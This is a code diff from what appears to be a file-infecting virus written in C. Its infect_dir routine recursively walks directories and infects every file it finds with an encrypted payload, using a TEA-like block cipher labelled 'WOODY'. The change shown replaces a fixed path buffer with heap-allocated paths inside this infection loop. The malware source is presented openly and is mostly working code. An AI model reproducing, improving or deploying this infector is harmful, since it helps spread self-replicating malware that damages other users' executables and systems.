@@ -6,6 +6,7 @@
 //char KEY[16];
 #define DATA 0x02
 
+char* ft_add_base(char*, char*);
 //======================= WOODY ==============================
 
 void encrypt_block(uint32_t* v, uint32_t *k) {
@@ -183,14 +184,11 @@ fail:
 	goto end;
 }
 
-#define LIM 1024
-
 int infect_dir(char *dirname, char *b, size_t bn, size_t crypt_off, size_t crypt_len, struct s_opt opt){
 	//print("infecting directory:");
 	//println(dirname);
 	struct linux_dirent *d;
 	char		p[4096];
-	char		tmp[LIM];
 	int		fd;
 
 	if ((fd = ft_open(dirname, 65536, 0)) < 0) return fail("open dir");
@@ -208,16 +206,17 @@ int infect_dir(char *dirname, char *b, size_t bn, size_t crypt_off, size_t crypt
 		while (x < size){
 			d = (struct linux_dirent*)(p + x);
 			if (opt.do_recur && !str_equal(d->d_name, ".") && !str_equal(d->d_name, "..") &&  d_isdir(d)){
-				add_base((char *)tmp, dirname, d->d_name, LIM);
-				infect_dir((char*)tmp, b,bn,crypt_off,crypt_len,opt);
+				char *t = ft_add_base(dirname, d->d_name);
+				infect_dir(t, b,bn,crypt_off,crypt_len,opt);
+				ft_free(t);
 			}
 			else if (d_isfile(d)){
-				add_base((char *)tmp, dirname, d->d_name, LIM);
-				infect(tmp, /*debug_name*/(tmp), b, bn, crypt_off, crypt_len, opt);
+				char *t = ft_add_base(dirname, d->d_name);
+				infect(t, t, b, bn, crypt_off, crypt_len, opt);
+				ft_free(t);
 			}
 			x += d->d_reclen;
 		}
 	}
 	ft_close(fd);
 }
-
